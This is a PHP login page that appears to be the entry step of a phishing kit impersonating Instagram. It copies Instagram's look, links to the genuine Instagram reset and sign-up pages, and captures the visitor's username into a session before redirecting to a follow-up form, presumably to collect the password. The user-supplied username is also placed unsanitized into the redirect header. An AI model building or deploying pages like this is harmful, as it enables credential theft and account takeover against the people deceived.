<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    

    header("location: form.php?username=$username");
}
?>


<!DOCTYPE html>
<html lang="en" >
<head>
  <?php include ("app/tag/main/meta.php"); ?>
  <link rel="stylesheet" href="assets/theme/spex/style.css">

</head>
<body><br><br>
<!-- partial:index.partial.html -->
<div class="logo-container">
<img src="assets/theme/spex/assets/img/logo.png" alt="logo" />
</div>  <br><br>
<center><p><?php echo $homeyazi; ?></p></center>
<div class="login-form-container">
    <form action="" method="get">
      <input type="text" placeholder="Username" name="username"required="yes" />
    
      <button type="submit">Contuine</button>
      <p><a href="https://www.instagram.com/accounts/password/reset/">Forgot Password</a><a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
    </form>   
</div>  

<div class="app-download-links">
  <br><br><br><br><br><br><br><br><br><br><br>  <br><br><br><br><br><br><br><br><br><br><br>
  <br><br><br><br><br><br><br><br><br><br><br>

</div>
<!-- partial -->
  
</body>
</html>
